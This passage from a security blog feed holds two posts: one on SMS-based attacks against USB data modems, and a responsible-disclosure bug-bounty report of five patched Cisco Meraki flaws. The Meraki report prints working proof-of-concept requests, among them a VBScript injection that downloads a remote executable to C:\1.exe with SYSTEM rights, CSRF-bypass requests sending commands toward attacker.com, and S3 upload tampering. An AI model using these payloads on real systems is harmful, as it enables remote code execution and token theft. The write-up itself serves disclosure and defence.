_*Introduction: 
*_ 
Offensively focused research is of high importance...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><a href="http://garage4hackers.com/attachment.php?attachmentid=639"  title="Name:  
Views: 
Size:  ">Attachment 639</a><br />
<u><b>Introduction:<br />
</b></u><br />
Offensively focused research is of high importance mainly because of the increase in no of targeted attacks. This blog focus on an innovative new attacks surface [USB Data Modems] that could possibly be a potential target to attacks in the future.  <br />
<br />
<br />
We would not be releasing the POC exploit we have found on various modem devices for another 3 months, mainly because there is no autoupdate mechanism available on these modems. Even though I was not able to make a highly sophisticated exploit I have come up with POC codes to demonstrate the damages. And a highly skilled exploit writer could make all the devices out there vulnerable to this attacks. <u><b>So once this blog is published am gone ask all the device vendors to enable/add an auto update mechanism on these device and push the patches to there costumers. </b></u> <br />
<br />
<a href="http://garage4hackers.com/attachment.php?attachmentid=659"  title="Name:  
Views: 
Size:  ">Attachment 659</a><br />
<br />
<b>I have added another blog post with analysis to the auto update feature of each vendors in <a href="http://www.garage4hackers.com/blogs/8/sms-shell-fuzzing-usb-internet-modems-analysis-autoupdate-features-1083/" target="_blank">India</a>:</b><br />
<br />
<a href="http://www.garage4hackers.com/blogs/8/sms-shell-fuzzing-usb-internet-modems-analysis-autoupdate-features-1083/" target="_blank">http://www.garage4hackers.com/blogs/...features-1083/</a><br />
<br />
But if you wann discuss something about this with me catch me up on twitter and the same is my gmail.<br />
<br />
<a href="https://twitter.com/fb1h2s" target="_blank">https://twitter.com/fb1h2s</a><br />
<br />
<br />
<i> In-order to explain the attack surface to a wider range of readers am splitting  this blog into two sections one section for technical people and another for non technical guys.  So we will highlight the many things you can do attacking USB modems in a less technical way , and a detail technical overview of the attacks could be read form the slides. The technical slides explains fuzzing approaches and code execution on computers via USB modems.<br />
</i><br />
<br />
<b><u>Detail Technical Slides : <a href="http://www.slideshare.net/RahulSasi2/fuzzing-usb-modems-rahusasi?utm_source=ss&amp;utm_medium=upload&amp;utm_campaign=g4h#" target="_blank">Fuzzing usb modems rahu_sasi</a><br />
</u></b><br />
<br />
Or a Quick Preview Video here:<br />
<br />

<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/AN8z7wmFvV4?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
<br />
This was my talk at CanSecWest [Canada] and Nullcon[Goa] .<br />
<br />
<u><b>So you can view the Nullcon Talk video here:<br />
</b></u><br />

<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/0en-xfxSUpk?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
<br />
<br />
<u><b>A  Less technical Explanation of attack possibility here:<br />
</b></u><br />
<br />
<b>USB Data Modems:<br />
</b> <br />
A USB modem used for mobile broadband Internet, referred to as a dongle is widely used these days. USB wireless modems use the USB port on the laptop to make it connect to a GSM/CDMA network there by creating a PPPoE(Point to Point protocol over Ethernet) interface to your computer. These devices are supplied with dialer software either written by the hardware manufacture or by the mobile supplier. They also come bundled with device driver. One of the interesting features that are added to these dialer software’s is an interface to read/sent SMS from your computer directly. This is mainly done for sending promotion offers and advertising.  These SMS modules added to the dialers, simply check the connected USB modem for incoming SMS messages, and if any new message is found it’s parsed and moved to a local sqlite database, which is further used to populate the SMS viewer. The device driver, which comes default with these devices [devices are in CDFS file systems that has the software in it] are installed on the host system, they usually provide interrupt handling for asynchronous hardware interface. <br />
<br />
<br />
<br />
<br />
<b><u>Attacking by SMS:<br />
</u></b><br />
<br />
<i>“You can run, you can hide but u can’t escape these exploits”.<br />
</i><br />
<br />
There is already a lot of research done on SMS attacks on mobile phones by Collin mullier, Charlie Miller, Nico Golde.<br />
Based on their research it was easy to find SMS payloads that crashed the phones but reliable code execution was hard on the mobile platforms. As well as the limitation of character that could be send over SMS was an issue. <br />
<br />
Same disadvantage is there with USB modem exploitations as it is not that easy to write a reliable exploit even though finding a security crash is easy. An advantage is no user interaction is required, as soon as SMS is received on modem the parser [dialer] tries to read the data. And parse it and move it to the local database. And parser runs as a privileged user. <br />
<br />
<br />
A normal web browser or network layer attacks need either user interaction or their target to be online attacks. But SMS based exploit does not have these drawbacks, as soon as a victim gets online his service provider would forward the message to his Inbox. Mass exploitation and high reliability of targets, since these modems have a phone no which lies in a particular series, so all the phone numbers starting with xxxxxx1000 to xxxxxx2000 would be running a particular version of USB modem software so the impact is large. Moreover the applications are not compiled with ASLR|DEP instead depend on system level security mechanisms. <br />
<br />
<br />
<u><b>Phishing Attacks:<br />
</b></u><br />
These device parse display HTML hyperlinks in sms contents, so phishing based attacks can also be triggered via sms. So there are chances you can see Phishing attacks that might come in the form of an SMS asking users to download a malware to there computer, the following video will explain one such attack.<br />
<br />

<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/M9qx83mjQJQ?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
<br />
<b><u>Fuzzing:<br />
</u></b><br />
<br />
Targeting USB Modems For Fun and Profit:<br />
<br />
<u><b>For Fun: DDOS Attacks on USB Modem Users.<br />
</b></u><br />
The user connects to Internet using the dialer provided with the modem. So when a malformed SMS packet arrives on the modem the dialer app tries to parse the data and crashes, causing the user to get knocked of the Internet. One such attack would of great fun and profit. Imagine some one sending 1000 users ranging form mobile no 9xxxxxx000 - 9xxxxxx999 with a malformed SMS, in on such case u could knock all the online users offline instantly. Since the guaranteed bandwidth is shared among multiple users you now have the advantage of less users using the Internet, so probably better speed for us [evil]. <br />
<br />
<u><b>Crashing USB modems with an SMS:<br />
</b></u><br />
<br />
<u><b>View Video:<br />
</b></u><br />
<br />

<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/SZ25MOrpJFs?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
<b><u>For Profit: Easy Code execution on Computers.<br />
</u></b><br />
<br />
Unlike mobile phones, code execution would be easy on computers. We have demonstrated poc codes to demonstrate reliable code execution on your computer via SMS payloads. We have also explained the hurdles we came across and how we tackled those situations in our technical slides, except that we have removed the bug details temporarily. <br />
<br />
<i><b><u>Remote Code Execution Digisol:<br />
</u></b></i>
<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/EwM2stAu5_Y?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
<b><u>Fuzzing Device Drivers:<br />
</u></b><br />
The attacks would not be complete with out reviewing the security aspects of device drivers. In the slides we have  demonstrated how to fuzz these devices. We would be explaining the various device driver operations and the possible fuzz inputs that are common to these devices. We will share our Fuzz notes and tools we used to successfully test these devices in after 3 months. The review of local device driver security was done on both Windows and Mac OSX systems. <br />
<br />
<br />
<b><u>Attacks and Consequences: <br />
</u></b><br />
These attacks would not be flagged by your firewalls, mainly because the SMS is received over a GSM/CDMA line that is connected directly to your computer. So there would be no alerting from any of your security devices on these attacks. Also maintaining anonymity over SMS based exploit is easy. But there were some issue faced when transmitting the payloads over the service providers firewalls, we would explain how we get past those hurdles. <br />
<br />
<b><u>Conclusion:<br />
</u></b><br />
Due to the rise in Data modem users, understanding and reviewing the security architecture of these devices is important. The talk I gave at CanSecWest [Canada] and Nullcon[Goa] focused on over the all security impact of these devices.If your still interested in technical details please go through the slides ;).This research would also  help Antivirus, Firewall, and security appliance vendors and independent security researchers to proactively stop such attacks form happening in the future. <br />
<br />
<br />
<b><u>Read Technical slides here: <br />
</u></b><br />
<a href="http://www.slideshare.net/RahulSasi2/fuzzing-usb-modems-rahusasi?utm_source=ss&amp;utm_medium=upload&amp;utm_campaign=quick-view#" target="_blank">http://www.slideshare.net/RahulSasi2/fuzzing-usb-modems-rahusasi?utm_source=ss&amp;utm_medium=upload&amp;utm_campa  ign=g4h#<br />
</a><br />
<br />
<a href="http://garage4hackers.com/attachment.php?attachmentid=640"  title="Name:  
Views: 
Size:  ">Attachment 640</a><br />
<br />
<a href="http://garage4hackers.com/attachment.php?attachmentid=641"  title="Name:  
Views: 
Size:  ">Attachment 641</a><br />
<br />
<br />
Continue here: <a href="http://www.slideshare.net/RahulSasi2/fuzzing-usb-modems-rahusasi?utm_source=ss&amp;utm_medium=upload&amp;utm_campaign=quick-view#" target="_blank">Fuzzing usb modems rahu_sasi</a></blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=1066</guid>
		</item>
		<item>
			<title>A weekend with Cisco Meraki Bug Bounty, a tale of few web bugs .</title>
			<link>http://garage4hackers.com/entry.php?b=1044</link>
			<pubDate>Tue, 02 Jul 2013 08:45:28 GMT</pubDate>
			<description>I was not much interested in bug bounties but the fact that I was interested in learning about Cloud Based products, and going through meraki...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">I was not much interested in bug bounties but the fact that I was interested in learning about Cloud Based products, and going through <a href="http://meraki.cisco.com/&#8206;&lt;br /&gt;http://meraki.cisco.com/&#8206;&lt;br /&gt;" target="_blank">meraki</a> made me a lot interested in there service. Meraki is a &quot;cloud-managed network infrastructure company,&quot; whose products are designed to provide large-scale, distributed wired and wireless networks. An application to manage networks from cloud is big and cool to experiment for a hacker. <br />
<br />
So I decided to spent a week end of mine [ May 4th and 5th ] trying to understand there products and working and hacking them.  All the bugs mentioned here are reported to them by may second week and patched .I am a lot thankful to meraki for giving this opportunity . I was not planning to post this bug report as there is nothing new in it, but later decided to blog about them. This was mainly because I see a lot of my friends who participate in bug bounties and get paid but I hardly get to see there bug reports :P .  So even if this is small I decided to share it .<br />
<br />
<br />
<b><u>Bug 1: Remote Client code Execution <br />
</u></b><br />
<br />
Meraki System Manger:<br />
<br />
Is a remote management application to manage Windows|Linux|Android|Mac machines from the cloud. <br />
<br />
The meraki live tools, part of system manager application allows manager users to sent a message to the remote client. <br />
<br />
<a href="https://n34.meraki.com/Systems-Manager/n/Vo6a5cI/manage/pcc/list#pn=clientid" target="_blank">https://n34.meraki.com/Systems-Manag...st#pn=clientid</a>.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=614&amp;d=1372754665" border="0" alt="Name:  b1_im1.jpg
Views: 1393
Size:  15.4 KB"  style="float: CONFIG" /><br />
<br />
This allows the admin to sent a message to a connected client and the message would be displayed to the end user.<br />
<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=603&amp;d=1372750045" border="0" alt="Name:  b1_im2.jpg
Views: 1403
Size:  24.9 KB"  style="float: CONFIG" /><br />
<br />
 <br />
<br />
Even though this feature is only supposed to display a message box to the end user, this is vulnerable to a remote code execution on the client user. <br />
<br />
<u>How Send Notification works. <br />
</u><br />
On sending the following notification request on System manager app to client.<br />
<br />
POST /Systems-Manager/n/Vo6a5cI/manage/pcc/msg/582090251837638886 HTTP/1.1<br />
Host: n34.meraki.com<br />
Connection: keep-alive<br />
Origin: <a href="https://n34.meraki.com" target="_blank">https://n34.meraki.com</a><br />
X-Requested-With: XMLHttpRequest<br />
Cookie:<br />
<br />
msg=fb1h2s<br />
<br />
<br />
 <img src="http://garage4hackers.com/attachment.php?attachmentid=604&amp;d=1372750162" border="0" alt="Name:  b1_im3.jpg
Views: 1331
Size:  23.3 KB"  style="float: CONFIG" /><br />
<br />
The meraki client [m_agen-service.exe] communicates with the remote meraki server for fetching instructions.  Once the notification text is received the applications writes it to a vbs file at %temp%/m_agent-msg.vbs with a message box code.<br />
With some reverse engineering I was able to figure this out. <img src="http://garage4hackers.com/attachment.php?attachmentid=605&amp;d=1372750600" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.05.53 PM.png
Views: 1304
Size:  11.2 KB"  style="float: CONFIG" /><br />
<br />
And later execute it using cscript.exe with the privileges of nt authority\system.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=606&amp;d=1372750612" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.05.59 PM.png
Views: 1300
Size:  14.7 KB"  style="float: CONFIG" /><br />
<br />
<br />
<br />
The above functional architecture is pretty poor as well as no filtering is done on what text goes inside the vbs file.<br />
<br />
It is possible for an attacker to inject additional vbs code to the temp file and get it executed by truncating the message box code with a double quote.<br />
<br />
<u><b>Poc code: <br />
</b></u><br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=607&amp;d=1372750621" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.06.08 PM.png
Views: 1295
Size:  14.7 KB"  style="float: CONFIG" /><br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:84px;">POST /Systems-Manager/n/Vo6a5cI/manage/pcc/msg/582090251837638886 

msg=fb1h2s” 
           More vbs code here
          ‘ Comment out second double quote</pre>
</div>This way it’s possible to use the system notification option to download deploy a metsploit metpreter executable, or any other malicious applications. The following poc request | code download a remote file and write it to c:\1.exe .<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:252px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">POST&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">Systems</span><span style="color: #007700">-</span><span style="color: #0000BB">Manager</span><span style="color: #007700">/</span><span style="color: #0000BB">n</span><span style="color: #007700">/</span><span style="color: #0000BB">Vo6a5cI</span><span style="color: #007700">/</span><span style="color: #0000BB">manage</span><span style="color: #007700">/</span><span style="color: #0000BB">pcc</span><span style="color: #007700">/</span><span style="color: #0000BB">msg</span><span style="color: #007700">/</span><span style="color: #0000BB">582090251837638886&nbsp;HTTP</span><span style="color: #007700">/</span><span style="color: #0000BB">1.1<br />Host</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">n34</span><span style="color: #007700">.</span><span style="color: #0000BB">meraki</span><span style="color: #007700">.</span><span style="color: #0000BB">com<br />Connection</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">keep</span><span style="color: #007700">-</span><span style="color: #0000BB">alive<br />X</span><span style="color: #007700">-</span><span style="color: #0000BB">Requested</span><span style="color: #007700">-</span><span style="color: #0000BB">With</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">XMLHttpRequest<br />Cookie</span><span style="color: #007700">:&nbsp;<br /><br /></span><span style="color: #0000BB">msg</span><span style="color: #007700">=</span><span style="color: #0000BB">1</span><span style="color: #DD0000">"<br />u&nbsp;=&nbsp;"</span><span style="color: #0000BB">http</span><span style="color: #007700">:</span><span style="color: #FF8000">//www.in.com/"<br /></span><span style="color: #0000BB">d&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"C:\1.exe"<br /></span><span style="color: #0000BB">Set&nbsp;h&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">CreateObject</span><span style="color: #007700">(</span><span style="color: #DD0000">"MSXML2.XMLHTTP"</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">Set&nbsp;s&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">CreateObject</span><span style="color: #007700">(</span><span style="color: #DD0000">"ADODB.Stream"</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">h</span><span style="color: #007700">.</span><span style="color: #0000BB">open&nbsp;</span><span style="color: #DD0000">"GET"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">u</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">false<br />h</span><span style="color: #007700">.</span><span style="color: #0000BB">send</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">s</span><span style="color: #007700">.</span><span style="color: #0000BB">Open<br />s</span><span style="color: #007700">.</span><span style="color: #0000BB">Type&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />s</span><span style="color: #007700">.</span><span style="color: #0000BB">Write&nbsp;h</span><span style="color: #007700">.</span><span style="color: #0000BB">ResponseBody<br />s</span><span style="color: #007700">.</span><span style="color: #0000BB">Position&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />s</span><span style="color: #007700">.</span><span style="color: #0000BB">SaveToFile&nbsp;d<br /></span><span style="color: #DD0000">'&nbsp;<br /></span>
</span>
</code></code></div>
</div><img src="http://garage4hackers.com/attachment.php?attachmentid=608&amp;d=1372751116" border="0" alt="Name:  metpre.jpg
Views: 1403
Size:  26.4 KB"  style="float: CONFIG" /><br />
Image from Internet:<br />
<br />
<br />
<u><b>Impact And Recomendations:<br />
</b></u><br />
It is possible to use the same bug to get code execution on all connected clients .<br />
<br />
<br />
Using Cscript to launch a message box would not a good idea.I am not adding recommendations here, as am not fully aware of the functional requirements for this feature. <br />
<br />
<br />
Now this is a bug in the remote client management interface the criticality is less since the application itself is a remote management software. The bug would be by default worse if this is posible form a non-admin account. There was a least privileged manager user, but I was not able to test from that user based on some difficulties I faced trying to register a non-manager account. I confirmed this with Jeo Pomes [meraki] and he confirmed that user was not vulnerable to this attack.<br />
<br />
Now inorder to make this more critical we need to find and XSS or CSRF bug , that way it would be Kaboom and mass pawning. <u><b>So the rest of the bugs were found to make the first bug more dangerous .</b></u><br />
<br />
<u><b>BUG 2: <br />
</b></u><br />
<br />
<br />
<u>Bug 2: XSS in Systems Manager<br />
</u>Criticality: Medium<br />
<br />
<br />
Affected Page: <br />
<a href="https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/configure/pcc_mobile_profiles" target="_blank">https://n34.meraki.com/Systems-Manag...obile_profiles</a><br />
<br />
The Application where it accepts IOS configuration file does not properly sanitize the filename parameter. This allows an arbitrary payload injection.<br />
There is a small filtering in the backend on the filename, which could be easily bypassed. The filter only checks for [ ; , : , / , \ , ” , ; ] characters. And if any of the above occurrences in the string is found, the input is truncated from that index.<br />
<br />
We can bypass the above filter by crafting a payload that does not require any filtered characters; an example of on such filename payload would be.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=609&amp;d=1372752579" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.39.04 PM.png
Views: 1286
Size:  17.7 KB"  style="float: CONFIG" /><br />
<br />
<br />
<u>POC replication: <br />
</u><br />
1) A configuration files with any of these filenames [possible on mac or Lnx ] <br />
<br />
 <img src="http://garage4hackers.com/attachment.php?attachmentid=610&amp;d=1372752622" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.39.59 PM.jpg
Views: 1292
Size:  7.8 KB"  style="float: CONFIG" /><br />
<br />
<br />
2) Upload the configuration file at <br />
<br />
<a href="https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/configure/pcc_mobile_profiles" target="_blank">https://n34.meraki.com/Systems-Manag...obile_profiles</a><br />
<br />
<br />
<br />
<u><u><b>Bug 3:  CSRF token leakage. <br />
</b></u></u>Criticality: Medium<br />
<br />
The above bug can be used to leak the victim CSRF token. <br />
An interesting thing about the above bug is, it’s possible to leak the CSRF token (authenticity_token) of the victim. Even though it’s obvious that the tokens could be stolen using the above XSS, am trying to address a second issue here. <br />
<br />
The above page loads the following javascript.<br />
<a href="https://n34.meraki.com/javascripts/vendor.pack.js?mtime=1363890917" target="_blank">https://n34.meraki.com/javascripts/v...ime=1363890917</a><br />
<br />
 And if the crafted payload is a &lt;script&gt; tag with a source,<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=611&amp;d=1372752729" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.41.40 PM.png
Views: 1291
Size:  11.0 KB"  style="float: CONFIG" /><br />
<br />
then the above JavaScript will make an XHR request, crafting the following request. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=612&amp;d=1372752754" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.41.49 PM.jpg
Views: 1285
Size:  15.9 KB"  style="float: CONFIG" /><br />
<br />
Here the victims &amp;authenticity_token [token] and a parameter &amp;_ [current time stamp] is passed on as GET request to the attacker controlled value sas.jpeg. With this bug it’s possible for a remote attacker to steel victims tokens by making the source point to an attacker controlled domain, and steel the tokens. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=613&amp;d=1372752890" border="0" alt="Name:  Screen Shot 2013-07-02 at 1.42.38 PM.jpg
Views: 1344
Size:  17.1 KB"  style="float: CONFIG" /><br />
I was not able to find a filter bypass for http:// [:// ] . This could have been an option [http&amp; # 58 ; &amp; # 4 7 ; &amp; # 4 7 ] but since “ ;” is filtered this does not work. But in older browsers something like this should work &lt;script src=&quot;aa@attacker.com&quot; &gt;. This XSS can be triggered using the below mentioned CSRF protection bypass bug as well by a remote attacker.  I went for help online from <a href="http://amolnaik4.blogspot.com/" target="_blank">Amol naik</a> and<a href="http://ironwasp.org" target="_blank"> Lavakumar Kuppan</a> and had a very good discussion . <br />
<br />
Now we have an XSS not quite useful but fun one. I also noticed this small issue that could lead to code execution using the first bug if the admin is using a vulnerable version of flash. The main reason for addressing on such bug is the fact that meraki system manager, that can send shell commands to remote users as well as the Bug 1 were we explained code execution and if there is small chance for CSRF then it would be pretty bad.<br />
<br />
<b><u>Bug 4: CSRF Protection Bypass:<br />
</u></b>Criticality : Medium<br />
<br />
Currently the CSRF protection for the application is taken care by two methods, 1) checking Ajax HTTP headers 2) by checking a CSRF token.<br />
The issue is if either one of the above conditions satisfies in a request then the request is validated.  So even if the authentication_token is removed from a request and added with a X-Requested-With: XMLHttpRequest , the request would be successful. And under certain conditions it is possible to forge an X-requested with header. <br />
<br />
<u>Vulnerability:<br />
</u><br />
 Under certain conditions the Ajax Http headers could be forged and custom http headers could be added there by defeating the application CSRF protection mechanism. The vulnerability affects meraki users who are running on low version of flash.  Many critical calls in the application depend on Ajax headers for CSRF protection.  So there by crafting a malicious flash page it would be possible to affect meraki users who’s browsers run a lower version of flash. A detailed write up of the bug could be read form here.Ruby on Rails, which is used by meraki has patched the header bypass issue, but the patches require meraki developers to fix their code to always send a CSRF token in Ajax requests. .<br />
<br />
<a href="http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html" target="_blank">http://lists.webappsec.org/pipermail...ry/007533.html</a><br />
<br />
Using the above issue the following poc exploit was prepared. <br />
<br />
<u>POC 1: <br />
</u><br />
1) Send reports to attacker controlled email.<br />
<br />
POST /Live-Demo-Branch/n/sWS0Fa/manage/reports/email HTTP/1.1<br />
Host: n1.meraki.com<br />
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:20.0) Gecko/20100101 Firefox/20.0<br />
Accept: */*<br />
Accept-Language: en-gb,en;q=0.5<br />
Accept-Encoding: gzip, deflate<br />
Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br />
X-Requested-With: XMLHttpRequest<br />
Referer: <a href="https://n1.meraki.com/Live-Demo-Branch/n/sWS0Fa/manage/reports" target="_blank">https://n1.meraki.com/Live-Demo-Bran...manage/reports</a><br />
Content-Length: 74<br />
Cookie: [striped] <br />
<br />
email=loverahulsa%40gmail.com<br />
<br />
<br />
<u>POC 2:  CSRF Bypass, Client remote code execution. <br />
</u><br />
Meraki system manager,  can send shell commands to remote users. This request ping a machine.<br />
<br />
POST /Systems-Manager/n/7iHAgbI/manage/pcc/command HTTP/1.1<br />
Host: n34.meraki.com<br />
Connection: keep-alive<br />
Content-Length: 53<br />
Accept: */*<br />
Origin: <a href="https://n34.meraki.com" target="_blank">https://n34.meraki.com</a><br />
X-Requested-With: XMLHttpRequest<br />
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31<br />
Content-Type: application/x-www-form-urlencoded<br />
DNT: 1<br />
Referer: <a href="https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/pcc/command" target="_blank">https://n34.meraki.com/Systems-Manag...ge/pcc/command</a><br />
Accept-Encoding: gzip,deflate,sdch<br />
Accept-Language: en-US,en;q=0.8<br />
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3<br />
Cookie: __cfduid=<br />
<br />
machines[]=582090251837638398&amp;command=ping+attacker.com<br />
<br />
The machine no in the current request could be bruteforced easily as the machine no 58209025183763[1-2-3-4] is not a random and falls in the same range. So we can make our flash program send request from 582090251837638[000] – 582090251837638[999].  Here remote command is a ping request; the attacker server could be notified by a successful attack by sniffing incoming ICMP packets. <br />
<br />
<br />
<b><u>Fix:<br />
</u></b><br />
Having one such critical code execution feature makes it important that the application does not fully depend on a spoof able source like “x-requested-with” headers, even though the chances are very less. Also if a new header-spoofing bug were discovered in java, flash etc, then all of meraki’s products would be vulnerable.  There for it’s highly recommended to relay on access_token or x-request-header and access-token together. <br />
<br />
<br />
<br />
While understanding and finding a bypass for the above bug XSS bug I noticed few other issues, and I reported those as well to meraki :<br />
<br />
<b><u>Bug 5: Malicious file uploading in meraki.<br />
</u></b><br />
<br />
The meraki system manager has got an option to configure a software installer for the clients.[ The module we found XSS on ]<br />
<u><a href="https://n34" target="_blank">https://n34</a>.</u>meraki<u>.com/Systems-Manager/n/Vo6a5cI/manage/pcc/installer</u><br />
<br />
Based on the docunmentation  here. <br />
<br />
<u><a href="https://docs" target="_blank">https://docs</a>.</u>meraki<u>.com/display/SM/Configure+%3E+Software+installer</u><br />
<br />
&quot;<br />
Please keep in mind that you will only be able to deploy .msi files to Windows machines and .pkg files to Mac OS machines.<br />
The software management tool will only allow one type of file to be uploaded at once.<br />
&quot;<br />
It seems like the application is made to only accept .msi and .pkg files to be uploded . And also only one type at a time.<br />
<br />
<br />
But it was possible to bypass these restrictions to perform the following actions.<br />
<br />
1) Upload files with any file extension to Meraki amazon s3.<br />
2) Upload file to a different path than the root path.<br />
3) Upload any number of files to Meraki S3 account , and use Meraki s3 as a personal file sharing server.<br />
<br />
Based on our analysis , an opensource ruby on rails project [carrierwave direct ] was used on &quot;/Systems-Manager/n/Vo6a5cI/manage/pcc/installer&quot; page.<br />
<br />
Project: <u><a href="https://github.com/dwilkie/carrierwave_direct" target="_blank">https://github.com/dwilkie/carrierwave_direct</a></u><br />
<br />
The current version of the carrierwave direct code powering meraki is outdated .<br />
<br />
<br />
<br />
1) Upload files with any file extension to Meraki amazon s3.<br />
<br />
It is possible to alter the fileupload post request to meraki<u>-pcc-installers.s3.amazonaws.com</u> and alter the file name<br />
to any extension of attackers choice. Only validation is done at client side and no server side validation is performed.<br />
<br />
Sample Request:<br />
<br />
POST /sas HTTP/1.1<br />
Host: meraki<u>-pcc-installers.s3.amazonaws.com</u><br />
<br />
------------GI3gL6ei4Ef1Ij5Ij5Ef1ae0ei4ei4<br />
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;sas.mp3&quot;<br />
Content-Type: application/octet-stream<br />
<br />
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;<br />
&lt;!DOCTYPE cross-domain-policy SYSTEM<br />
<br />
<br />
Recreating the POC:<br />
<br />
Rename an Mp3 file to msi, upload the file and tamper the request and modify the file name to .mp3 extension. <br />
The application will upload the posted file and write to the dom that a msi file was uploded, but in reality the file uploded<br />
would be an mp3 file.<br />
<br />
Poc uploaded mp3 song :<br />
<br />
<u>http://</u>meraki<u>-pcc-installers.s3.amazonaws.com/475c5df1536ecdc194b7b4b630756242e450e201/nejukullae.mp3</u><br />
<br />
<br />
<br />
2) Upload Multiple Files to Meraki S3 account.<br />
<br />
It's possible to use meraki account as a personal file sharing space.<br />
<br />
Poc Files: <br />
<br />
<u>http://</u>meraki<u>-pcc-installers.s3.amazonaws.com/475c5df1536ecdc194b7b4b630756242e450e201%2Ftest.pk  g</u><br />
<u>http://</u>meraki<u>-pcc-installers.s3.amazonaws.com/475c5df1536ecdc194b7b4b630756242e450e201%2Ftest.jp  eg</u><br />
<u>http://</u>meraki<u>-pcc-installers.s3.amazonaws.com/475c5df1536ecdc194b7b4b630756242e450e201%2Ftest.ex  e</u><br />
<br />
<br />
3) Upload files to a different path than the upload root path.<br />
<br />
The upload code relies on the  form-data key value to set the upload path, and that value is used with out filtering.<br />
<br />
POST /sas HTTP/1.1<br />
Host: meraki<u>-pcc-installers.s3.amazonaws.com</u><br />
<br />
<br />
------------GI3gL6ei4Ef1Ij5Ij5Ef1ae0ei4ei4<br />
Content-Disposition: form-data; name=&quot;key&quot;<br />
<br />
475c5df1536ecdc194b7b4b630756242e450e201/${filename}<br />
<br />
<br />
<br />
If we modify it to<br />
<br />
------------GI3gL6ei4Ef1Ij5Ij5Ef1ae0ei4ei4<br />
Content-Disposition: form-data; name=&quot;key&quot;<br />
<br />
475c5df1536ecdc194b7b4b630756242e450e201.txt<br />
<br />
<br />
Then an attacker can create a file on the server root path.<br />
<br />
POC file created:<br />
<br />
<u>http://</u>meraki<u>-pcc-installers.s3.amazonaws.com/475c5df1536ecdc194b7b4b630756242e450e201.txt</u><br />
<br />
<br />
Same way an existing file could be replaced with a malicious file as well. For example uploded chrome installer<br />
<br />
/key/chrome.exe could be replaced with a malicious exe , if a second post request is made using the same name.<br />
<br />
<br />
<br />
<u>Consequences of the above exploits.<br />
</u><br />
1) A user can upload an malicious exe file and get it flagged by Amazon S3 or other URL monitors and get meraki<u>-pcc-installers.s3.amazonaws.com</u><br />
account blocked or the domain blacklisted. Malware developers can use Meraki account as a malware controller. <br />
<br />
2) A user can use meraki s3 account as his/her personal file sharing space. I have already reported about creating multiple<br />
user accounts using a single [gmail]email id in my previous report. That technique can be used to create n no of accounts.<br />
<br />
3) Even though the open source code carrierwave_direct has got a file extension whitelisting and and file size limit,<br />
<u><a href="https://github.com/dwilkie/carrierwave_direct/blob/master/spec/orm/activerecord_spec.rb" target="_blank">https://github.com/dwilkie/carrierwa...record_spec.rb</a></u><br />
<br />
I don't find it configured properly on meraki.<br />
<br />
4) Unlimited file hosting for the attacker . <br />
<br />
<br />
<b><u>Fix:<br />
</u></b><br />
Update meraki to the latest version of carrierwave_direct<br />
<br />
Filter all user controlled input for file name creation, set max|min file uploading size, set file extension whitelist. <br />
<br />
